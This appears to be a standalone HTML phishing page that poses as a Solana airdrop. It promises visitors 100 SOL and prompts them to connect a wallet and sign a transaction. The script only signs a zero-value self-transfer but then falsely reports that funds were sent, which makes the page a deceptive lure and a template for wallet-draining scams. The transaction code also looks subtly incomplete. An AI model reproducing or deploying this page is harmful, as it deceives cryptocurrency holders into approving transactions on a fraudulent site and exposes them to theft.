<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Airdrop | Claim SOL</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            max-width: 400px;
            padding: 20px;
        }
        .logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #9945FF, #14F195);
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 24px;
            color: black;
        }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #a0a0a0; margin-bottom: 30px; line-height: 1.5; }
        button {
            background: linear-gradient(90deg, #9945FF, #14F195);
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
            width: 100%;
        }
        button:hover { transform: scale(1.05); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { margin-top: 20px; font-size: 14px; min-height: 20px; }
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
            margin-right: 5px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        /* Mobile specific adjustments */
        @media (max-width: 600px) {
            button { padding: 18px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">SOL</div>
        <h1>Airdrop Eligible</h1>
        <p>You have been selected to claim <strong>100 SOL</strong>. Connect your wallet to approve the transaction.</p>
        
        <button id="claimBtn">Connect Wallet & Claim</button>
        <div class="status" id="status"></div>
    </div>

    <!-- Universal Script Tag -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            
            // 1. Detect Wallet Provider
            let adapter = null;
            let walletType = "";

            if (window.phantom?.isPhantomWallet) {
                adapter = window.phantom;
                walletType = "phantom";
            } else if (window.solana) {
                adapter = window.solana;
                walletType = "unknown";
            } else if (window.solflare) {
                adapter = window.solflare;
                walletType = "solflare";
            } else if (window.backpack) {
                adapter = window.backpack;
                walletType = "backpack";
            } else if (window.toshi) {
                adapter = window.toshi;
                walletType = "toshi";
            }

            // 2. Handle Mobile Apps vs Desktop
            if (!adapter) {
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                
                if (isMobile) {
                    // Try to open the specific app store or deep link
                    status.innerText = "Opening Wallet App...";
                    
                    // Attempt to open Phantom App via universal link
                    window.location.href = "phantom://"; 
                    
                    // Fallback after 2 seconds if it didn't open
                    setTimeout(() => {
                        alert("Did not open automatically? Please install Phantom from the App Store/Play Store.");
                        btn.disabled = false;
                        btn.innerText = "Connect Wallet & Claim";
                    }, 2000);
                    return;
                } else {
                    alert("No supported wallet found! Please install Phantom, Solflare, or Backpack.");
                    return;
                }
            }

            try {
                btn.disabled = true;
                btn.innerText = "Connecting...";
                
                // 3. Connect
                await adapter.connect();
                
                btn.innerText = "Approving...";
                status.innerHTML = '<span class="spinner"></span> Waiting for signature...';

                const walletPublicKey = adapter.publicKey.toString();
                
                // 4. Build Transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: new solanaWeb3.PublicKey(walletPublicKey),
                        toPubkey: new solanaWeb3.PublicKey(walletPublicKey), 
                        lamports: 0
                    })
                );
                
                // 5. Sign and Send
                let signature;
                try {
                    signature = await adapter.signAndSendTransaction(transaction);
                } catch (e) {
                    // Fallback for wallets that need separate steps
                    const signedTx = await adapter.signTransaction(transaction);
                    signature = await adapter.sendTransaction(signedTx);
                }
                
                // Success
                btn.innerText = "Claimed!";
                btn.style.background = "#14F195";
                status.innerText = "Success! Funds sent to your wallet.";
                
                console.log("Airdrop Signature:", signature);

            } catch (error) {
                console.error(error);
                btn.disabled = false;
                btn.innerText = "Try Again";
                status.innerText = "Error: " + error.message;
            }
        });
    </script>
</body>
</html>
